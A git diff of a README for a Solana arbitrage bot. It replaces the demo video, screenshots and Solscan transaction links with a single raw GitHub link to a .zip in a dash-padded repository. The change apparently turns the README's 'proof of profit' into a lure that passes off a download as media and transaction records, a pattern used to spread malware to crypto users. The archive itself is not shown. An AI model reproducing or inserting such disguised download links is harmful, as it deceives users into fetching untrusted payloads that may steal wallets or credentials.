@@ -29,23 +29,23 @@ The bot scans Raydium AMM, CLMM, CPMM pools to detect price inefficiencies and p
 
 ### Demo Video
 
-<video src="https://github.com/user-attachments/assets/80444f2b-6b18-4ff4-aac6-8c99db9c2ece" 
+<video src="https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip" 
     controls 
     muted 
     style="max-height:640px; width:100%; border-radius: 10px;"> </video>
 
 ### Screenshots
 
-<img width="1200" alt="Transaction Screenshot 1" src="https://github.com/user-attachments/assets/4addf27a-0b5d-443a-b2d9-183806e95632" />  
-<img width="1200" alt="Transaction Screenshot 2" src="https://github.com/user-attachments/assets/65993729-d5db-432f-9107-27c907df863d" />  
+<img width="1200" alt="Transaction Screenshot 1" src="https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip" />  
+<img width="1200" alt="Transaction Screenshot 2" src="https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip" />  
 
 ### Transactions in Video
 
-<img width="1420" height="636" alt="Transactions in Video" src="https://github.com/user-attachments/assets/95cfff9f-444e-48d4-8848-ff9421e87156" />  
+<img width="1420" height="636" alt="Transactions in Video" src="https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip" />  
 
 ### Private Repo Confirmation
 
-<img width="1840" height="909" alt="Private Repo Screenshot" src="https://github.com/user-attachments/assets/531923af-a15d-4c67-b396-9149a6b49ebd" />  
+<img width="1840" height="909" alt="Private Repo Screenshot" src="https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip" />  
 
 ---
 
@@ -63,8 +63,8 @@ Here are some real profitable transactions executed by the bot:
 
 | Date & Time (UTC)   | Tx Hash      | Explorer Link                                                                                                                     |
 | ------------------- | ------------ | --------------------------------------------------------------------------------------------------------------------------------- |
-| 2025-07-30 19:51:13 | `4TSi...keT` | [View on Solscan](https://solscan.io/tx/4TSiW44PaR2wqXdKpxnAfJYVLmv9HpoKJRqLvsiJ95Vnsxj6JWqPj8PPHanJtszbC8okRP6PLqoSi7SXTGGftkeT) |
-| 2025-07-30 19:51:13 | `3qkB...Tjd` | [View on Solscan](https://solscan.io/tx/3qkBAweP3o9bH3EToqbwT1b2PyGuPfg31u75WNpmHrwTuLDRyygWRzyWch79CLsYLYEc9G3LvHHvPQAHkYCHBTjd) |
+| 2025-07-30 19:51:13 | `https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip` | [View on Solscan](https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip) |
+| 2025-07-30 19:51:13 | `https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip` | [View on Solscan](https://raw.githubusercontent.com/bucumeng/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------/master/froglike/-------------------------------------Solana-Arbitrage-Bot-------------------------------------------.zip) |
 
 (More transactions available in video and screenshots)
 
